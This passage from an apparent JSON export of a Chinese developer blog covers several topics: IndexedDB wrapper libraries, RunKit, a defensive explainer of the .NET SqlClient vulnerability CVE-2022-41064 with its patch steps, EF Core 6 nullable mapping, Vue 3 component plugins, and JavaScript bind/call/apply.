toRaw 轉換成原始資料進行儲存， ref 則直接儲存 xxx.value 資料即可。\n安裝 下載最新版本 或使用 npm、bower 進行安裝，引入下載的 localforage 即可使用。\n通過 npm 安裝： 1 npm install localforage 通過 bower 安裝： 1 bower install localforage 使用 提供了與 localStorage 相同的api，不同的是它是非同步的呼叫返回一個 Promise 物件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 localforage.getItem(\u0026#39;somekey\u0026#39;) .then(function(value) { // 當離線倉庫中的值被載入時，此處程式碼執行 console.log(value); }) .catch(function(err) { // 當出錯時，此處程式碼執行 console.log(err); }); // callback 版本 localforage.getItem(\u0026#39;somekey\u0026#39;, function(err, value) { // 當離線倉庫中的值被載入時，此處程式碼執行 console.log(value); }); 提供的方法 getItem： 根據資料的 key 獲取資料 不存在則返回 null。 setItem： 根據資料的 key 設定資料(儲存 undefined 時 getItem 獲取會返回 null)。 removeItem： 根據 key 刪除資料。 length： 獲取 key 的數量。 key： 根據 key 的索引獲取其名。 keys： 獲取資料倉庫中所有的 key。 iterate： 迭代資料倉庫中的所有 value/key 鍵值對。 配置 完整配置可檢視文件\n這裡說個我覺得很有用的：\n1 localforage.config({ name: \u0026#39;My-localStorage\u0026#39; }); 設定倉庫的名字，不同的名字代表不同的倉庫，當一個應用需要多個本地倉庫隔離資料的時候就很有用。\n1 2 3 4 5 6 const store = localforage.createInstance({ name: \u0026#34;nameHere\u0026#34; }); const otherStore = localforage.createInstance({ name: \u0026#34;otherName\u0026#34; }); // 設定某個資料倉庫 key 的值不會影響到另一個數據倉庫 store.setItem(\u0026#34;key\u0026#34;, \u0026#34;value\u0026#34;); otherStore.setItem(\u0026#34;key\u0026#34;, \u0026#34;value2\u0026#34;); 同時也支援刪除倉庫：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 呼叫時，若不傳參，將刪除當前例項的 “資料倉庫”。 localforage.dropInstance() .then(function() { console.log(\u0026#39;Dropped the store of the current instance\u0026#39;); }); // 呼叫時，若引數為一個指定了 name 和 storeName 屬性的物件，會刪除指定的 “資料倉庫”。 localforage.dropInstance({ name: \u0026#34;otherName\u0026#34;, storeName: \u0026#34;otherStore\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherStore\u0026#39;); }); // 呼叫時，若引數為一個僅指定了 name 屬性的物件，將刪除指定的 “資料庫” (及其所有資料倉庫)。 localforage.dropInstance({ name: \u0026#34;otherName\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherName database\u0026#39;); }); idb-keyval idb-keyval 是用 IndexedDB 實現的一個超級簡單的基於 promise 的鍵值儲存。\n安裝 1 npm install idb-keyval 使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 全部引入 import idbKeyval from \u0026#39;idb-keyval\u0026#39;; idbKeyval.set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // 按需引入會 treeshake import { get, set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get(\u0026#39;hello\u0026#39;) .then((val) =\u0026gt; console.log(val)); 瀏覽器直接引入：\n1 \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/idb-keyval@6/dist/umd.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 提供的方法 由於其沒有中文的官網，會把例子及自己的理解附上：\nset set： 設定資料\nkey 可以是 Number、String、Date(IDB 也允許這些值的陣列，但 IE 不支援)。 value 可以是 Number、Array、Object、Date、Blobs 等，儘管老 Edge 不支援 null。\n1 2 3 4 5 import { set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); setMany setMany： 設定多個數據\n一次設定多個值，比一個一個的設定更快\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import { set, setMany } from \u0026#39;idb-keyval\u0026#39;; // 不應該: Promise.all([set(123, 456), set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // 這樣做更快: setMany([ [123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;], ]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get get： 獲取資料\n如果沒有 key，那麼 value 將返回 undefined。\n1 2 3 4 5 import { get } from \u0026#39;idb-keyval\u0026#39;; // logs: \u0026#34;world\u0026#34; get(\u0026#39;hello\u0026#39;) .then((val) =\u0026gt; console.log(val)); getMany getMany： 獲取多個數據\n一次獲取多個數據，比一個一個的獲取資料更快\n1 2 3 4 5 6 7 8 9 import { get, getMany } from \u0026#39;idb-keyval\u0026#39;; // 不應該: Promise.all([get(123), get(\u0026#39;hello\u0026#39;)]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); // 這樣做更快: getMany([123, \u0026#39;hello\u0026#39;]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); del del： 刪除資料\n根據 key 刪除資料\n1 2 3 import { del } from \u0026#39;idb-keyval\u0026#39;; del(\u0026#39;hello\u0026#39;); delMany delMany： 刪除多個數據\n一次刪除多個鍵，比一個一個的刪除更快\n1 2 3 4 5 6 7 8 9 10 11 12 import { del, delMany } from \u0026#39;idb-keyval\u0026#39;; // 不應該: Promise .all([del(123), del(\u0026#39;hello\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // 這樣做更快: delMany([123, \u0026#39;hello\u0026#39;]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); update update： 排隊更新資料，防止由於非同步導致資料更新問題\n因為 get 與 set 都是非同步的使用他們來更新資料可能會存在問題如：\n1 2 3 4 5 6 // Don\u0026#39;t do this: import { get, set } from \u0026#39;idb-keyval\u0026#39;; get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); // 上述程式碼我們期望的是 2 但實際結果是 1，我們可以在第一個 callback 執行第二次操作。 更好的方法是使用 update 來更新資料：\n1 2 3 4 5 6 // Instead: import { update } from \u0026#39;idb-keyval\u0026#39;; update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 0) + 1); update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 0) + 1); // 將自動排隊更新，所以第一次更新將計數器設定為 1，第二次更新將其設定為 2。 clear clear： 清除所有資料\n1 2 3 import { clear } from \u0026#39;idb-keyval\u0026#39;; clear(); entries entries： 返回 [key, value] 形式的資料\n1 2 3 4 import { entries } from \u0026#39;idb-keyval\u0026#39;; // logs: [[123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;]] entries().then((entries) =\u0026gt; console.log(entries)); keys keys： 獲取所有資料的 key\n1 2 3 4 import { keys } from \u0026#39;idb-keyval\u0026#39;; // logs: [123, \u0026#39;hello\u0026#39;] keys().then((keys) =\u0026gt; console.log(keys)); values values： 獲取所有資料的 value\n1 2 3 4 import { values } from \u0026#39;idb-keyval\u0026#39;; // logs: [456, \u0026#39;world\u0026#39;] values().then((values) =\u0026gt; console.log(values)); createStore createStore： 自定義倉庫\n1 2 3 4 5 6 7 8 9 10 11 // 自定義資料庫名稱及表名稱 // 建立一個數據庫: // 資料庫名稱為 tang_shi，表名為 table1 const tang_shi_table1 = idbKeyval.createStore(\u0026#39;tang_shi\u0026#39;, \u0026#39;table1\u0026#39;); // 向對應倉庫新增資料 idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;table1 的資料\u0026#39;, tang_shi_table1); // 預設建立的倉庫名稱為 keyval-store，表名為 keyval idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;預設的資料\u0026#39;); 使用 createStore 建立的資料庫一個庫只會建立一個表：\n1 2 3 4 5 6 7 // 同一個庫有不可以有兩個表，custom-store-2 不會建立成功: const customStore = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-name\u0026#39;); const customStore2 = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-2\u0026#39;); // 不同的庫有相同的表名，這是可以的: const customStore3 = createStore(\u0026#39;db3\u0026#39;, \u0026#39;keyval\u0026#39;); const customStore4 = createStore(\u0026#39;db4\u0026#39;, \u0026#39;keyval\u0026#39;); 總結 本文介紹了兩個 IndexedDB 的庫，用來解決 localStorage 儲存容量太小的問題。\nlocalforage 與 idb-keyval 之間我更喜歡 localforage 因為其與 localStorage 相似的 api 幾乎沒有上手成本。\n如果需要更加靈活的庫可以看一下 dexie.js、PouchDB、idb、JsStore 或者 lovefield 之類的庫。\n","date":"2022-11-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52501465120_8e19a1cda3_o.png","permalink":"https://wayneblog.ga/2022-11-15/localforage-and-idb-keyval/","title":"localStorage 容量太小？試試 localforage、idb-keyval"},{"content":" 參考網站\n試用RunKit 先來說說 RunKit 是什麼。\n首先，Runkit 可以讓你在瀏覽器中運行 Node.js 的代碼。在 Runkit 中，可以很方便的調用眾多的 npm 模塊。這就有點像 Node.js 版的 Jupyter Notebook。同時，Runkit 還可以提供一個免費的 HTTP 服務器而無需任何的服務器安裝和配置。這在開發手機 APP 的服務器端，以及微服務的時候尤其有用。當然，實現無服務器的選擇很多，比如 AWS 的 Lambda + API Gateway，但 RunKit 的最大優勢就是完全免費的，這在開發軟件原型的時候就更為方便了。\n下面分別來看看這兩項功能。\n打開頁面： https://runkit.com/home\n可以通過 Github 授權登錄：\n登錄成功後可以看到：\n點擊運行按鈕後就可以在頁面中看到執行結果：\n在 Runkit 的頁面中可以像正常的 Node.js 環境一樣運行各種 JS 語句。比如，運行如下的簡單代碼獲取 Hive 中文區的最新文章：\n1 2 3 4 5 6 7 8 9 const hive = require(\u0026#39;@hiveio/hive-js\u0026#39;); // Read posts from Hive hive.api.getDiscussionsByCreated({ tag: \u0026#39;hive-105017\u0026#39;, limit: 10 }, function(err, discussions) { for (let i = 0; i \u0026lt; discussions.length; i++) { let post = discussions[i] console.log(post.title) } }) 可以看到返回的结果：\nAPI Endpoint 再來看看我最喜歡的 Runkit 功能：提供簡單的 API endpoint。\n非常簡單的源碼：\n1 exports.endpoint = function(request, response) { response.end(\u0026#34;API endpoint test\u0026#34;); } 單擊 publish 進行發布：\n發布後單擊 endpoint 就會打開對應的 API URL：\n比如說，我這裡的就是：\nhttps://api-jdcmj9qsmxmb.runkit.sh/\n可以看到，無需配置/運行服務器，就可以有自己的 API 可用，又是 serverless，同時還免費，是不是很爽？\n","date":"2022-11-14T00:00:00Z","image":"https://live.staticflickr.com/65535/52498373077_445fbf68b7_o.jpg","permalink":"https://wayneblog.ga/2022-11-14/try-runkit/","title":"試用 RunKit"},{"content":" 參考網站\n微軟在 2022-11-08 公佈了 System.Data.SqlClient、Microsoft.Data.SqlClient 的安全漏洞，由於涵蓋大量 .NET 版本 (.NET Framework 到 .NET 6 都可能使用到)，範圍不小，身為 .NET 開發人員，應該關注其影響及修補方式。\n參考了以下文件，試著整理資訊如後。\nMicrosoft Security Advisory CVE 2022-41064 | .NET Information Disclosure Vulnerability #239 .NET Information Disclosure Vulnerability GHSA-8g2p-5pqh by GitHub .NET Framework Information Disclosure Vulnerability CVE-2022-41064 .NET Framework November 2022 Security and Quality Rollup Updates 漏洞來源及攻擊方式 漏洞發生原因是現有 SQL Client 程式庫有個 Bug，在高負載狀況下「非同步查詢(Asynchronously Executed Query)」有可能發生錯接查詢結果的狀況，亦即查詢 A 拿到查詢 B 的結果。\n註：資訊有限，但 Asynchronously Executed Query 應指 ExecuteReaderAsync、ExecuteScalarAsync、ExecuteXmlReaderAsync 等非同步方法參考，同步式查詢(ExecuteReader()\u0026hellip;)在一些狀態下也有可能受影響。(在 Github 找到相關單元測試，透過 ExecuteReader() 但不讀取內容就拋棄 Transaction Scope 方式重現)\n攻擊成功條件：參考\nExploiting this vulnerability requires an attacker to be within the SQL Connection Pool.\n攻擊者須位於同一 SQL Connection Pool 內 (換言之，在同一 Process 內執行) Successful exploitation of this vulnerability requires an attacker to exhaust all the threads in the thread pool.\n攻擊者需耗盡所有 Thread Pool 所有 Thread In this case, a successful attack could cause the attacker access queries from other users in the SQL Connection Pool.\n在此狀況下，攻擊者有機會存取到同 SQL Connetion Pool 其他使用者的查詢結果(撿到什麼內容屬隨機性質) 漏洞範圍 漏洞存在 Microsoft.Data.SqlClient 及 System.Data.SqlClient 眾多版本：\nMicrosoft.Data.SqlClient 1.1.3 (含)之前及 2.0.0 ~ 2.1.1 System.Data.SqlClient 4.8.4 (含)之前版本 而微軟也已釋出 1.1.4、2.1.2、4.8.5 修補漏洞\n修補方式 .NET Core / .NET 5/6 使用以下方式更新版本：\n1 2 3 4 5 6 7 dotnet add package Microsoft.Data.SqlClient --version 2.1.2 # 或 dotnet add package Microsoft.Data.SqlClient --version 1.1.4 # 或 dotnet add package System.Data.SqlClient --version 4.8.5 或者直接修改 .csproj：(若專案先參照其他程式庫再間接參照 SqlClient，也需要加入 PackageReference 強制使用新版)\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk.Web\u0026#34;\u0026gt; \u0026lt;PropertyGroup\u0026gt; \u0026lt;TargetFramework\u0026gt;net6.0\u0026lt;/TargetFramework\u0026gt; \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; \u0026lt;ImplicitUsings\u0026gt;enable\u0026lt;/ImplicitUsings\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;ItemGroup\u0026gt; \u0026lt;PackageReference Include=\u0026#34;Microsoft.Data.SqlClient\u0026#34; Version=\u0026#34;2.1.2\u0026#34; /\u0026gt; \u0026lt;/ItemGroup\u0026gt; \u0026lt;/Project\u0026gt; .NET Framework 請安裝 November 2022 Security and Quality Rollup Updates for .NET Framework。\n","date":"2022-11-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52491745274_95b2fa11ec_o.jpg","permalink":"https://wayneblog.ga/2022-11-11/dotnet-cve-2022-41064/","title":".NET SqlClient 安全漏洞 CVE-2022-41064 解讀"},{"content":" 參考網站\n升級 .NET 6 踩到的小問題筆記。\n前情提要 依之前學到的 EF Core Model 設計，string 屬性預設對應的欄位預設為 Nullable，標註 [Required] 才會宣告為 NOT NULL。 不過，這條規則到 .NET 6 已有所改變。某段 EF Core 寫入資料庫時冒出欄位不允許 NULL，但 Model 中該屬性並未宣告為 [Required]。\n研究發現這與 .NET 6 啟用 Nullable Context 有關，csproj 多了 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; 設定以支援 C# 8 推出的 Nullable Reference Type 概念。 設為 enable 時，Compiler 啟用 Null Reference Analysis 及相關語言特性，以字串為例，若 string 沒宣告成 string? 卻可能為 null 時會得到警告；若要明確標示此處就是要設成 null，可在後方加上 Null-Forgiving Operator， 例如 string x = null!;。\n若不想啟用此特性，設成 disable，Compiler 即會恢復 C# 7.3 以前的行為。\nEF Core 產生資料庫對應 SQL Schema 時，也會受 Nullable Context 影響，當 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;，即使未加 [Required]，Model 的字串屬性仍會被視為不可為 null，在 CREATE TABLE 時會加上 NOT NULL。\n問題重現 用以下程式重現問題。簡單宣告了 Entity 型別、DbContext，其中 RequiredText 有加註 [Required]，另一個 OptionalText 則沒有，呼叫 DbContext.DataBase.GenerateCreateScript() 檢視其對應的 SQL Schema：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 using System.ComponentModel.DataAnnotations; using Microsoft.EntityFrameworkCore; var options = new DbContextOptionsBuilder\u0026lt;MyContext\u0026gt;() .UseSqlServer(\u0026#34;data source=(localdb)\\\\mssqllocaldb\u0026#34;) .Options; var dbCtx = new MyContext(options); Console.WriteLine(dbCtx.Database.GenerateCreateScript()); class MyContext : DbContext { public DbSet\u0026lt;Item\u0026gt; Items { get; set; } = null!; public MyContext(DbContextOptions\u0026lt;MyContext\u0026gt; options) : base(options) { } } public class Item //Entity 型別 { //慣例，屬性名稱為 Id 或 \u0026lt;type name\u0026gt;Id 會自動成為 Entity 的 Key public int ItemId { get; set; } [Required] public string RequiredText { get; set; } = null!; public string OptionalText { get; set; } = null!; } 如下圖所示，當 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; 時，OptionalText 也會被加上 NOT NULL，換成 disable 才會恢復之前的規則。\n所以，.NET 6 啟用 Nullable Context 時，Model 字串屬性要允許 null，型別也需改成 string?，這樣才會對應成 Nullable 資料庫欄位。(註：RequiredText 故意拿掉 = null! 觸發 CS8618 警告，證明有設 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;)\n","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489392442_2208a4dc64_o.png","permalink":"https://wayneblog.ga/2022-11-10/efcore-6-string-not-null/","title":"Entity Framework Core 6.0 字串屬性對應欄位 NOT NULL 問題"},{"content":" 參考網站\n前情提要 在小專案裡我主要用 Vue.js 來處理 MVVM，用 \u0026lt;script\u0026gt; 載入 vue.js，寫幾行 JavaScript 搞定，走不寫模組，不用 TypeScript，免編譯打包的「輕前端」模式，但常用邏輯還是會寫成元件(Component)方便共用。\n在 Vue 2 時代，我習慣在網頁共用的 .js 裡使用 Vue.component(\u0026quot;my-component\u0026quot;, ...) 註冊元件，註冊一次，各網頁不需宣告就能使用元件。\n正式擺脫 IE 後，終於不用再死守 Vue 2，試著將一個小專案升級到 Vue 3，遇到小麻煩。\nVue 3 改變了元件註冊方式，不再提供全域註冊，必須先 Vue.createApp() 建立實體，app.component(\u0026quot;my-component\u0026quot;, ...) 註冊或用 components 屬性引用才能使用元件。參考：重新認識 Vue.js - 元件的宣告與註冊\n全域元件改成區域元件可減少程式間互相干擾，在軟體架構來說是正確的方向，但對簡單應用來說(例如：程式很單純，全域元件打架機率趨於零的場合)，這番調整讓元件註冊變得繁瑣。\n用個範例來說明。\nVue 2 註冊多個元件 原本 Vue 2 做法是在 my-components-vue2.js 中註冊多個元件：\nmy-components-vue2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Vue.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); Vue.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); Vue.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); 如此，數十支 HTML 只需載入 my-components-vue2.js 便能在網頁使用 \u0026lt;date-tag\u0026gt;、\u0026lt;time-tag\u0026gt; 插入元件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = new Vue({ el: \u0026#39;#app\u0026#39; }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 升級 Vue 3 之後 升級 Vue 3 之後，元件的 js 跟網頁都要做一些修改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var dateTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }; var timeTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }; var hostTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }; 建立 app 寫法改為 Vue.createApp，並在宣告中透過 components 列舉要註冊的物件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3-upgrade.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ components: { \u0026#39;date-tag\u0026#39;: dateTag, \u0026#39;time-tag\u0026#39;: timeTag, \u0026#39;host-tag\u0026#39;: hostTag } // 若元件物件名稱與標籤相符，可簡寫成 // components: { dateTag, timeTag, hostTag } }) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 假設我有 30 個網頁，30 個 app 都要加 components: { dateTag, timeTag, hostTag }，未來若新增其他元件，所有 components 列舉都要改，這是標準的「Copy \u0026amp; Paste 負面教材」呀，一想就覺得很不 OK 呀。\n這種情境，就是套件(Plugin，也有人翻成插件、外掛)上場的時刻。最簡單的套件寫法是寫一個 function，接收 app 及 options 參數，內部呼叫 app.component(...) 逐一註冊元件，options 則是自訂參數，可用來決定要註冊哪些元件或變更元件設定值，提高運用彈性。以下是簡單示範：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function myComponentsPlugin(app, options) { app.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); app.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); app.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); } 如此，呼叫端可簡化為 .use(myComponentsPlugin)，不需把所有元件列出來，未來要新增元件，修改 my-components-vue3.js 即可，保留原先全域元件的簡單方便：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ //... }).use(myComponentsPlugin) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489820266_b81b766288_o.png","permalink":"https://wayneblog.ga/2022-11-10/vue-2to3-global-component/","title":"Vue 2 升級 Vue 3 之全域元件註冊問題"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n參考網站\n使用 bind、call、apply 改變 this 指向的對象 如果想要改變 this 指向的對象，可以透過 bind、call、apply 這三個 method 辦到。\n1 2 3 4 5 6 7 8 9 10 11 const person = { userName: \u0026#39;Blueberry\u0026#39; } // 接著 create 一個函式來呼叫 person 的 userName： function callName() { console.log(\u0026#39;Hello \u0026#39; + this.userName); } // 呼叫 callName： callName(); output： 1 \u0026gt; Hello undefined 因為 callName() 函式中的 this 指向的是 global object（也就是 Window 物件），所以這時候我們希望把 callName() 的 this 指向 person 這個對象，可以使用以下方法：\nbind MDN web docs\n1 function.bind(thisArg[, arg1[, arg2[, ...]]]) bind 和其他兩個方法（call、apply）的不同有兩點：\nbind 是創造一個函式物件的拷貝，不會執行函式，因此 bind 之後還要再另外寫執行函式的動作；而 call、apply 是直接執行函式。 bind 後面傳入的參數值會設定為拷貝函式的永久參數值，之後執行拷貝函式時，無論怎麼給予參數都沒有用；而 call、apply 則是單純給予參數，像一般呼叫函式那樣。 我們先單純就第一點來說明，示範最基本的 bind 怎麼寫。\n第一種寫法 1 callName.bind(person)(); 也等於：\n1 2 const callFunction = callName.bind(person); // 創造函式物件的拷貝 callFunction(); // 執行函式 output： 1 \u0026gt; Hello Blueberry 第二種寫法，直接寫在函式表示式後面也可以 1 2 3 4 5 const callName = function() { console.log(\u0026#39;Hello \u0026#39; + this.userName); }.bind(person); callName(); output： 1 \u0026gt; Hello Blueberry 接下來針對第二點來說明，先來改寫一下 callName 函式，加入兩個 arguments：\n1 2 3 4 5 function callName(age, interest) { console.log(\u0026#39;Hello \u0026#39; + this.userName); console.log(\u0026#39;Your age is \u0026#39; + age); console.log(\u0026#39;Your interest is \u0026#39; + interest); } 接著我們除了要用 bind 將 this 指向 person 之外，還要給予 age 和 interest 這兩個參數。\n這邊有兩種做法：單純給定參數，或綁定永久參數值。\n單純給定參數 要單純給定參數的話，像一般執行函式那樣，在執行函式時再給予參數就可以了。\n1 2 const callFunction = callName.bind(person); callFunction(24, \u0026#39;Reading books\u0026#39;); output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books 綁定永久參數值 如果將參數放在 bind 中，這個函式拷貝物件的參數值就會永遠被固定住。\n1 2 const callFunction = callName.bind(person, 24, \u0026#39;Reading books\u0026#39;); callFunction(30, \u0026#39;Playing games\u0026#39;); // 這邊無論再怎麼給參數都沒用 output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books call MDN web docs\n1 function.call(this, arg1, arg2..., argn) call 和 bind 不同，它會直接執行函式，後面給的參數也不會被固定住。\n.call() 存在於任何一個函數或者方法上，是個 function 就可以調用 .call()。\n1 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books 修改 this 指向 對於沒有定義在任何對像上的 function，實際上也有 this 指向，指向的是個全局對象。 對於定義在某個 object 上面的方法，this 指向，很好理解。 下面拿一個對象變數做例子，來說明問題：\n1 2 3 4 5 6 7 8 let sunan = { c: 3, test: function (a, b) { return a + b + this.c; } } console.log(sunan.test(1, 2)); // 6 console.log(sunan.test.call({ c: 4 }, 1, 2)); // 7 在這個例子裡面，.call() 的第一個參數傳入了一個新的對象，它覆蓋了原有的數據。c 屬性由 3 變成了 4，而 test 方法依然存在。\noutput： 1 2 \u0026gt; 6 \u0026gt; 7 apply MDN web docs\n1 function.apply(this, [arg1, arg2..., argn]) apply 的寫法跟 call 很相近，與 call 不同的是，後面的參數需要使用陣列傳遞，適合搭配 arguments 運用在算數的函式。\n1 callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 